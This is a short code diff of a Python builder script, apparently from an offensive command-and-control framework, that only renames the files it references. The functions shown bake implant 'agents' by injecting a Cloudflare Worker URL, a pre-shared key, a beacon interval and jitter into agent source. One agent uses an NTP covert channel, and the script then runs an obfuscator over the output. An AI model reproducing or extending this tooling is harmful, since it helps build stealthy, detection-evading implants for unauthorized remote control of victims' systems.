@@ -70,7 +70,7 @@ def _patch_agent(src: str, psk: str, interval: int, jitter: int) -> str:
 
 def _bake_agent_cloudflare(worker_url: str, psk: str, interval: int,
                             jitter: int, out_name: str) -> pathlib.Path:
-    src = (HERE / "cloudflare-worker" / "agent.py").read_text(encoding="utf-8")
+    src = (HERE / "cloudflare-worker" / "nullrelay.py").read_text(encoding="utf-8")
     src = re.sub(
         r'WORKER_URL\s*=\s*os\.environ\.get\([^)]+\)',
         f'WORKER_URL = os.environ.get("WORKER_URL", "{worker_url}")',
@@ -98,7 +98,7 @@ def _bake_agent_cloudflare(worker_url: str, psk: str, interval: int,
 
 def _bake_agent_ntp(psk: str, interval: int, jitter: int,
                     out_name: str) -> pathlib.Path:
-    ntp_agent = HERE / "ntp" / "agent.py"
+    ntp_agent = HERE / "ntp" / "clockvenom.py"
     if not ntp_agent.exists():
         raise FileNotFoundError(f"ntp agent not found: {ntp_agent}")
     src = _patch_agent(ntp_agent.read_text(encoding="utf-8"), psk, interval, jitter)
@@ -108,7 +108,7 @@ def _bake_agent_ntp(psk: str, interval: int, jitter: int,
 
 
 def _obfuscate(agent_path: pathlib.Path) -> pathlib.Path:
-    obf = HERE.parent / "Obfuscator" / "obfuscator_py.py"
+    obf = HERE.parent / "Obfuscator" / "shadowscript.py"
     if not obf.exists():
         raise FileNotFoundError(f"obfuscator not found: {obf}")
     subprocess.run([sys.executable, str(obf), str(agent_path)], check=True)
